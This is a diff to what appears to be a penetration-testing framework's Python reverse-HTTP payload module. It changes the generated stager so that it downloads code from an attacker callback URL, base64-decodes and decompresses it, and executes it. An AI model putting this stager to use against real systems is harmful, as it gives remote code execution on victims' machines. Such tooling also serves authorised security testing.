@@ -64,7 +64,7 @@ module Payload::Python::ReverseHttp
 
     # Generate the short default URL if we don't have enough space
     if self.available_space.nil? || required_space > self.available_space
-      uri_req_len = 5
+      uri_req_len = 30
     end
 
     generate_uri_uuid_mode(opts[:uri_uuid_mode] || :init_python, uri_req_len)
@@ -85,7 +85,7 @@ module Payload::Python::ReverseHttp
     urllib_fromlist << '\'HTTPSHandler\'' if opts[:scheme] == 'https'
     urllib_fromlist = '[' + urllib_fromlist.join(',') + ']'
 
-    cmd  = "import sys\n"
+    cmd  = "import zlib,base64,sys\n"
     cmd << "vi=sys.version_info\n"
     cmd << "ul=__import__({2:'urllib2',3:'urllib.request'}[vi[0]],fromlist=#{urllib_fromlist})\n"
     cmd << "hs=[]\n"
@@ -114,9 +114,9 @@ module Payload::Python::ReverseHttp
     cmd << "o=ul.build_opener(*hs)\n"
     cmd << "o.addheaders=[#{headers.join(',')}]\n"
     if opts[:header_host]
-      cmd << "exec(o.open(ul.Request('#{generate_callback_url(opts)}',None,{'Host':'#{var_escape.call(opts[:header_host])}'})).read())\n"
+      cmd << "exec(zlib.decompress(base64.b64decode(o.open(ul.Request('#{generate_callback_url(opts)}',None,{'Host':'#{var_escape.call(opts[:header_host])}'})).read())))\n"
     else
-      cmd << "exec(o.open('#{generate_callback_url(opts)}').read())\n"
+      cmd << "exec(zlib.decompress(base64.b64decode(o.open('#{generate_callback_url(opts)}').read())))\n"
     end
 
     py_create_exec_stub(cmd)
